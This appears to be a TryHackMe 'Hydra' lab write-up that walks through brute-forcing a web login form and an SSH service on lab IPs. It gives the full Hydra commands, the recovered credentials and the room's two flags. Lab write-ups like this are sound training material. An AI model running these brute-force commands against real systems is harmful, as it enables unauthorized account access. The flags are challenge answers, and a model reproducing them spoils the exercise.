# Hydra
Step 1: Access the Target
--

Open the target IP in my browser:

http://10.48.164.190

see a login page.

<img width="1915" height="938" alt="Screenshot 2026-04-30 192557" src="https://github.com/user-attachments/assets/320ccb70-301e-4884-947e-0b2cfb17b3bb" />



Step 2: Initial Login Attempt
--

Tried logging in manually, but got the error:

Your username or password is incorrect.

This indicates that the login form is a good candidate for a brute-force attack.

Step 3: Brute Force Web Login
--

Use Hydra to attack the HTTP POST login form.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.164.190 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v
Explanation:
-l molly → username
-P rockyou.txt → password wordlist
http-post-form → specifies login type
F=incorrect → failure message
-v → verbose output

Result
--
Hydra found valid credentials:

[80][http-post-form] host: 10.48.164.190   login: molly   password: sunshine
<img width="1095" height="726" alt="Screenshot 2026-04-30 193805" src="https://github.com/user-attachments/assets/8a9e3bf6-f97e-48c5-97b0-f432998754c8" />




Step 4: Login & Capture Flag 1
--
Login to the website using:

Username: molly
Password: sunshine

Flag 1:
THM{2673a7dd116de68e85c48ec0b1f2612e}
<img width="1897" height="544" alt="Screenshot 2026-04-30 193848" src="https://github.com/user-attachments/assets/89d71c20-9f01-4135-9b1b-204f1551047e" />



Step 5: Brute Force SSH
--
Next, brute-force the SSH service.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 -t4 ssh
Explanation:
ssh → targets SSH service
-t4 → 4 parallel threads (faster attack)
#Result
<img width="1892" height="872" alt="Screenshot 2026-04-30 194314" src="https://github.com/user-attachments/assets/6b268eed-800f-43b8-82bc-abd5c5d396ff" />


Hydra successfully found the SSH credentials and revealed:

THM{c8eeb0468febbadea859baeb33b2541b}
<img width="760" height="134" alt="Screenshot 2026-04-30 194345" src="https://github.com/user-attachments/assets/104602e4-2c85-4566-af54-293c0300ae9f" />
